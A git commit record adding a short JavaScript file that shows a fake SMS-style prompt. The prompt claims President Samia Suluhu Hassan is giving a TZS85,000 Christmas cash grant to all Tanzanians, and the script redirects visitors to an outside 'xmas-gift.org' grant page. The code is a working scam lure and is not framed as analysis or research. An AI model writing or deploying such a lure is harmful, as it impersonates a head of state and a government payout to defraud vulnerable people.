8be31a3501f4814c2d56f1159c3a95e994f4775f
4g-network <154092422+4g-network@users.noreply.github.com>
2024-11-21 14:25:00 -0800

    Create tanzania-active.js

---
+++ tanzania-active.js
@@ -0,0 +1,6 @@
+
+var password = 'TZS85,000 X-MAS GRANT'
+password=prompt('SMS: Congratulations You are qualify for President SAMIA SULUHU HASSAN TZS85,000 CHRISTMAS CASH GRANT FOR ALL TANZANIANS, Kindly Press OK to Withdraw Cash Prize   ','TZS85,000 X-MAS GRANT');
+if (password != 'TZS85,000 X-MAS GRANT') {
+location.href='https://xmas-gift.org/tanzania-grant.html';
+}
